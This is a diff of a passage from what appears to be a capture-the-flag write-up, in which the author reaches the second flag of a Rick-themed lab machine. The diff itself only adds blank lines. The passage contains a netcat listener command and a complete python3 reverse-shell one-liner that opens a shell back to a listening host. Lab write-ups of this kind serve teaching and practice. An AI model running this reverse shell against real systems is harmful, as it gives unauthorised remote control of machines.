@@ -52,8 +52,11 @@ I inserted this into the first clue and we've successfully found our first potio
 At this point, I tested python3 "print('hello')" to see if we would be able to run python scripts through the command and we were able to print hello succesfully! 
 
 I set up a nc listener on port 9001 in my terminal running:
+
 nc -lvnp 9001 
+
 using revshells.com I generated a python3 reverse shell:
+
 export RHOST="10.10.212.184";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
 
 Once I established a connection, I navigated the files until I checked the home directory. Here I found a directory named "Ricky". Inside that directory, I found a file named "second ingredients", so I knew that we had found our second flag. I read the file using cat *
